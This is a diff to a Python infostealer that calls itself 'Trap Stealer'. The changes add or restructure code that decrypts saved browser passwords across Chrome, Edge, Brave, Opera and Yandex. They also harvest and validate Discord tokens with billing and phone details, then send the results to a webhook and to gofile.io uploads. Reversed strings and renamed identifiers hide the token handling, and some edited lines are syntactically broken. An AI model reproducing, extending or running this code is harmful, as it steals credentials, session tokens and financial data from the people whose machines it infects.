@@ -109,7 +109,13 @@ try:
 except:
     pass
 
+class DATA_BLOB(Structure):
+    _fields_ = [
+        ('cbData', wintypes.DWORD),
+        ('pbData', POINTER(c_char))
+    ]
 
+    # ---------------------------------------------------------------
 
 if shitty_message == True:
     print('Importing Module...')
@@ -120,7 +126,44 @@ file_path = os.path.realpath(__file__)
 USER_NAME = getpass.getuser()
 
 
+from ctypes import *
+from Crypto.Cipher import AES
 
+
+class DATA_BLOB(Structure):
+    _fields_ = [
+        ('cbData', c_ulong),
+        ('pbData', POINTER(c_char))
+    ]
+
+def GetData(blob_out):
+    cbData = int(blob_out.cbData)
+    pbData = blob_out.pbData
+    buffer = create_string_buffer(cbData)
+    cdll.msvcrt.memcpy(buffer, pbData, cbData)
+    windll.kernel32.LocalFree(pbData)
+    return buffer.raw
+
+def CryptUnprotectData(encrypted_bytes, entropy=b''):
+    buffer_in = create_string_buffer(encrypted_bytes, len(encrypted_bytes))
+    buffer_entropy = create_string_buffer(entropy, len(entropy))
+    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
+    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
+    blob_out = DATA_BLOB()
+
+    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
+        return GetData(blob_out)
+
+def DecryptValue(buff, master_key=None):
+    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
+    if starts == 'v10' or starts == 'v11':
+        iv = buff[3:15]
+        payload = buff[15:]
+        cipher = AES.new(master_key, AES.MODE_GCM, iv)
+        decrypted_pass = cipher.decrypt(payload)
+        decrypted_pass = decrypted_pass[:-16].decode()
+        return decrypted_pass
+    
 
 def Clipboard():
   win32clipboard.OpenClipboard()
@@ -184,9 +227,9 @@ for modl in requirements:
         subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
         time.sleep(3)
 
-
+Dscptb= 'BTPdrocsiD'[::-1];Dsccana = 'yranaCdrocsiD'[::-1];Dscdev = 'tnempoleveDdrocsiD'[::-1]
 def NoDiscord():
-    folder_list = ['Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment']
+    folder_list = f['Discord', f'{Dsccana}', f'{Dscptb}', f'{Dscdev}']
     for folder_name in folder_list:
         folder_path = os.path.join(os.getenv('LOCALAPPDATA'), folder_name)
         if os.path.isdir(folder_path):
@@ -212,7 +255,7 @@ inj_url = "https://raw.githubusercontent.com/TheCuteOwl/Trap-Stealer/main/index.
 
 
 def inj_discord():
-    folder_list = ['Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment']
+    folder_list = f['Discord', f'{Dsccana}', f'{Dscptb}', f'{Dscdev}']
     for folder_name in reversed(folder_list):
         folder_path = os.path.join(os.getenv('LOCALAPPDATA'), folder_name)
         if os.path.isdir(folder_path):
@@ -310,58 +353,16 @@ badgeList =  [
         {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
     ]
 
-
-from ctypes import *
-from Crypto.Cipher import AES
-
-
-class DATA_BLOB(Structure):
-    _fields_ = [
-        ('cbData', c_ulong),
-        ('pbData', POINTER(c_char))
-    ]
-
-def GetData(blob_out):
-    cbData = int(blob_out.cbData)
-    pbData = blob_out.pbData
-    buffer = create_string_buffer(cbData)
-    cdll.msvcrt.memcpy(buffer, pbData, cbData)
-    windll.kernel32.LocalFree(pbData)
-    return buffer.raw
-
-def CryptUnprotectData(encrypted_bytes, entropy=b''):
-    buffer_in = create_string_buffer(encrypted_bytes, len(encrypted_bytes))
-    buffer_entropy = create_string_buffer(entropy, len(entropy))
-    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
-    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
-    blob_out = DATA_BLOB()
-
-    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
-        return GetData(blob_out)
-    
-
 if shitty_message == True:
-
     print('Adding Requests...')
-
 else:
     pass
 
-def DecryptValue(buff, master_key=None):
-    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
-    if starts == 'v10' or starts == 'v11':
-        iv = buff[3:15]
-        payload = buff[15:]
-        cipher = AES.new(master_key, AES.MODE_GCM, iv)
-        decrypted_pass = cipher.decrypt(payload)
-        decrypted_pass = decrypted_pass[:-16].decode()
-        return decrypted_pass
 
 
-
-def GetUHQFriends(token):
+def GetUHQFriends(Tokq):
     headers = {
-        "Authorization": token,
+        "Authorization": Tokq,
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     }
@@ -396,9 +397,9 @@ def GetBadge(flags):
             flags = flags % badge["Value"]
     return OwnedBadges
 
-def GetTokenInfo(token):
+def GetTokqInfo(Tokq):
     headers = {
-        "Authorization": token,
+        "Authorization": Tokq,
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     }
@@ -418,9 +419,9 @@ def GetTokenInfo(token):
 
     return username, hashtag, email, id, pfp, flags, nitro, phone
 
-def checkToken(token):
+def checkTokq(Tokq):
     headers = {
-        "Authorization": token,
+        "Authorization": Tokq,
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     }
@@ -430,9 +431,9 @@ def checkToken(token):
     except:
         return False
 
-def GetBilling(token):
+def GetBilling(Tokq):
     headers = {
-        "Authorization": token,
+        "Authorization": Tokq,
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     }
@@ -457,30 +458,30 @@ def GetBilling(token):
 
 
 
-def uploadToken(token, path):
+def uploadTokq(Tokq, path):
     headers = {
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     }
 
-    username, hashtag, email, user_id, pfp, flags, nitro, phone = GetTokenInfo(token)
+    username, hashtag, email, user_id, pfp, flags, nitro, phone = GetTokqInfo(Tokq)
 
     pfp = f"https://cdn.discordapp.com/avatars/{user_id}/{pfp}" if pfp else "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png"
 
-    billing = GetBilling(token);badge = GetBadge(flags);friends = GetUHQFriends(token)
+    billing = GetBilling(Tokq);badge = GetBadge(flags);friends = GetUHQFriends(Tokq)
 
     if friends == '': friends = "No Rare Friends"
     if not billing:
         badge, phone, billing = "🔒", "🔒", "🔒"
     if nitro == '' and badge == '': nitro = " -"
-
+    tok = 'nekoT'
     data = {
         "username": "Trap Stealer",
         "avatar_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png",
         "content": "",
         "embeds": [
             {
-                "title": "🍪 Trap Stealer Token",
+                "title": f"🍪 Trap Stealer {tok[::-1]}",
                 "description": f"`{path}` :\n",
                 "color": 0xffb6c1,
                 "author": {
@@ -496,8 +497,8 @@ def uploadToken(token, path):
                 },
                 "fields": [
                     {
-                        "name": "✨ Token:",
-                        "value": f"`{token}`"
+                        "name": f"✨ {tok[::-1]}:",
+                        "value": f"`{Tokq}`"
                     },
                     {
                         "name": ":mobile_phone: Phone:",
@@ -532,12 +533,25 @@ def uploadToken(token, path):
     }
 
     LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
+def upload_file(file_path):
+    try:
+        response = requests.post(
+            f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile',
+            files={'file': open(file_path, 'rb')}
+
+        )
+
+        return response.json()["data"]["downloadPage"]
+    
+    except:
+
+        return False
 
 
 
 
-Tokens = ''
-def getToken(path, arg):
+Tokqs = ''
+def getTokq(path, arg):
     if not os.path.exists(path): return
 
     path += arg
@@ -545,12 +559,12 @@ def getToken(path, arg):
         if file.endswith(".log") or file.endswith(".ldb")   :
             for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                 for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
-                    for token in re.findall(regex, line):
-                        global Tokens
-                        if checkToken(token):
-                            if not token in Tokens:
-                                Tokens += token
-                                uploadToken(token, path)
+                    for Tokq in re.findall(regex, line):
+                        global Tokqs
+                        if checkTokq(Tokq):
+                            if not Tokq in Tokqs:
+                                Tokqs += Tokq
+                                uploadTokq(Tokq, path)
 
 def GetDiscord(path, arg):
     if not os.path.exists(f"{path}/Local State"): return
@@ -565,62 +579,61 @@ def GetDiscord(path, arg):
     for file in os.listdir(pathC):
         if file.endswith(".log") or file.endswith(".ldb")   :
             for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
-                for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
-                    global Tokens
-                    tokenDecoded = DecryptValue(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
-                    if checkToken(tokenDecoded):
-                        if not tokenDecoded in Tokens:
-                            Tokens += tokenDecoded
-                            uploadToken(tokenDecoded, path)
+                for Tokq in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
+                    global Tokqs
+                    TokqDecoded = DecryptValue(b64decode(Tokq.split('dQw4w9WgXcQ:')[1]), master_key)
+                    if checkTokq(TokqDecoded):
+                        if not TokqDecoded in Tokqs:
+                            Tokqs += TokqDecoded
+                            uploadTokq(TokqDecoded, path)
 
 
-if shitty_message == True:
-    print('Everything Installed...')
-else:
-    pass
+def writeforfile(data, name):
+    path = os.getenv("TEMP") + f"\wp{name}.txt"
+    with open(path, mode='w', encoding='utf-8') as f:
+        f.write(f"Trap Stealer\n\n")
+        for line in data:
+            if line[0] != '':
+                f.write(f"{line}\n")
 
-def GetAll():
+paswWords = []
+Passw = []
+PasswCount = 0
+def getPassw(path, arg):
+    global Passw, PasswCount
+    if not os.path.exists(path): return
 
-    browserPaths = [
-        [f"{roaming}/Opera Software/Opera GX Stable", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],
-        [f"{roaming}/Opera Software/Opera Stable", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],
-        [f"{roaming}/Opera Software/Opera Neon/User Data/Default", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnknn"],
-        [f"{local}/Google/Chrome/User Data", "chrome.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],
-        [f"{local}/Google/Chrome SxS/User Data", "chrome.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],
-        [f"{local}/BraveSoftware/Brave-Browser/User Data", "brave.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],
-        [f"{local}/Yandex/YandexBrowser/User Data", "yandex.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"],
-        [f"{local}/Microsoft/Edge/User Data", "edge.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],
-        [f"{roaming}/Mozilla/Firefox/Profiles", "firefox.exe", "/storage/default", "/", "/networkCache", "/chrome/ididnkmllhcdpgnbehfkhbgmfigibfnh/Local Storage"],
-        [f"{local}/Vivaldi/User Data", "vivaldi.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],
-        [f"{local}/BraveSoftware/Brave-Browser-Beta/User Data", "brave.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],
-        [f"{local}/BraveSoftware/Brave-Browser-Nightly/User Data", "brave.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],
-        [f"{local}/Chromium/User Data", "chrome.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],
-    ]
+    pathC = path + arg + "/Login Data"
+    if os.stat(pathC).st_size == 0: return
 
-    discordPaths = [
-        [f"{roaming}/Discord", "/Local Storage/leveldb"],
-        [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
-        [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
-        [f"{roaming}/discordptb", "/Local Storage/leveldb"],
-    ]
+    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
 
-    for patt in browserPaths: 
-        a = threading.Thread(target=getToken, args=[patt[0], patt[2]])
-        a.start()
+    shutil.copy2(pathC, tempfold)
+    conn = sql_connect(tempfold)
+    cursor = conn.cursor()
+    cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
+    data = cursor.fetchall()
+    cursor.close()
+    conn.close()
+    os.remove(tempfold)
 
-    for patt in discordPaths: 
-        a = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
-        a.start()
+    pathKey = path + "/Local State"
+    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
+    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
+    master_key = CryptUnprotectData(master_key[5:])
 
-    for patt in browserPaths: 
-        a = threading.Thread(target=getPassw, args=[patt[0], patt[3]])
-        a.start()
-        Threadlist.append(a)
-
-try:
-    GetAll()
-except:
-    pass
+    for row in data: 
+        if row[0] != '':
+            for wa in keyword:
+                old = wa
+                if "https" in wa:
+                    tmp = wa
+                    wa = tmp.split('[')[1].split(']')[0]
+                if wa in row[0]:
+                    if not old in paswWords: paswWords.append(old)
+            Passw.append(f"URL: {row[0]} | Username: {row[1]} | Password: {DecryptValue(row[2], master_key)}")
+            PasswCount += 1
+    writeforfile(Passw, 'passw')
 
 sysinfo = systemInfo()
 data = {
@@ -651,102 +664,96 @@ headers = {
 
 LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
 
+if shitty_message == True:
+    print('Everything Installed...')
+else:
+    pass
+
+
+def GatherAll():
+    browserPaths = [
+        [f"{roaming}/Opera Software/Opera GX Stable", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
+        [f"{roaming}/Opera Software/Opera Stable", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
+        [f"{roaming}/Opera Software/Opera Neon/User Data/Default", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnknn" ],
+        [f"{local}/Google/Chrome/User Data", "chrome.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
+        [f"{local}/Google/Chrome SxS/User Data", "chrome.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
+        [f"{local}/BraveSoftware/Brave-Browser/User Data", "brave.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
+        [f"{local}/Yandex/YandexBrowser/User Data", "yandex.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
+        [f"{local}/Microsoft/Edge/User Data", "edge.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ]
+    ]
+    discordPaths = [
+        [f"{roaming}/Discord", "/Local Storage/leveldb"],
+        [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
+        [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
+        [f"{roaming}/discordptb", "/Local Storage/leveldb"],
+    ]
+    for patt in browserPaths:
+        a = threading.Thread(target=getTokq, args=[patt[0], patt[2]])
+        a.start()
+        Threadlist.append(a)
+    for patt in discordPaths:
+        a = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
+        a.start()
+        Threadlist.append(a)
+    for patt in browserPaths:
+        a = threading.Thread(target=getPassw, args=[patt[0], patt[3]])
+        a.start()
+        Threadlist.append(a)
+
+    # execute passw() after GatherAll() is done
+    for thread in Threadlist:
+        thread.join()
+    file = os.getenv("TEMP") + f"\wppassw.txt"; filename = "wppassw.txt"
+
+    a = upload_file(file)
+    embed_fields = [{"name": f"{filename}", "value": f"[Click here to download]({a})"}]
+
+    data = {
+        "username": "Trap Stealer",
+        "content": "",
+        "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
+        "embeds": [
+            {
+                "title": "🍪 Trap Stealer Password",
+                "description": "Password",
+                "color": 0xffb6c1,
+                "fields": embed_fields,
+                "thumbnail": {
+                    "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
+                },
+                "footer": {
+                    "text": "Trap Stealer | https://github.com/TheCuteOwl",
+                    "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+                }
+            }
+        ]
+    }
+
+    headers = {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+    }
+
+    LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
+
+
+
+
+
 keyword = [
     'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'
 ]
 
-pathing = 'none'
+GatherAll() 
 
-def writeforfile(data, name):
-    global path
-    path = os.getenv("TEMP") + f"\\wp{name}.txt"
-    with open(path, mode='w', encoding='utf-8') as f:
-        f.write(f"Trap Stealer Pass{base64.b64decode('d29yZA==')} Stealer 🔑\n\n")
-        for line in data:
-            if line[0] != '':
-                f.write(f"{line}\n")
-                print(name)
-    
+""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
 
-
-path = os.getenv("TEMP") + f"\\wppassw.txt"
-CookiCount, PasswCount = 0, 0
-paswWords = []
-
-Passw = []
-def getPassw(path, arg):
-    global Passw, PasswCount
-    if not os.path.exists(path): return
-
-    pathC = path + arg + "/Login Data"
-    if os.stat(pathC).st_size == 0: return
-
-    tempfold = temp + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
-
-    shutil.copy2(pathC, tempfold)
-    conn = sql_connect(tempfold)
-    cursor = conn.cursor()
-    cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
-    data = cursor.fetchall()
-    cursor.close()
-    conn.close()
-    os.remove(tempfold)
-
-    pathKey = path + "/Local State"
-    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
-    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
-    master_key = CryptUnprotectData(master_key[5:])
-
-    for row in data: 
-        if row[0] != '':
-            for wa in keyword:
-                old = wa
-                if "https" in wa:
-                    tmp = wa
-                    wa = tmp.split('[')[1].split(']')[0]
-                if wa in row[0]:
-                    if not old in paswWords: paswWords.append(old)
-            Passw.append(f"URL: {row[0]} | Username: {row[1]} | Password: {DecryptValue(row[2], master_key)}")
-            PasswCount += 1
-    writeforfile(Passw, 'passw')
-
-def passw():
-    file = {"file": open(path, "rb")}
-
-    data = {
-            "username": "Trap Stealer",
-            "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png"
-        }
-    response = requests.post(webhook, files=file, data=data)
-    try:
-        os.remove(path)
-    except:
-        pass
-
-try:
-    passw()
-except:
-    pass
-
+######################################################
 keywords = ["drowssap", "tellaw", "essap_edotom", "pdm", "essapedotom", "noken", "yek", "terces", "tterces", "ipa", "tnuocca", "nogin", "emusern", "liame", "enohp", "dircet tihcrac", "ytiruces yrtnuoces laicos", "sserdda", "etisoppa", "NIP", "trossap", "eciffo laicion", "dnocesorp", "tnuocca knalb", "gnitirw", "ytocryptocurrency", "niotcib", "muhtyre", "etelpmoc", "evig", "noitartsinimda"]
 extension = ".txt"
 
 
 import concurrent.futures
-
-def upload_file(file_path):
-    try:
-        response = requests.post(
-            f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile',
-            files={'file': open(file_path, 'rb')}
-        )
-
-        return response.json()["data"]["downloadPage"]
-    
-    except:
-
-        return False
-
 
 file_paths = []
 
@@ -1006,7 +1013,6 @@ try:
     Camera_get()
 except:
     pass
-
 
 if fakeerror == True:
 
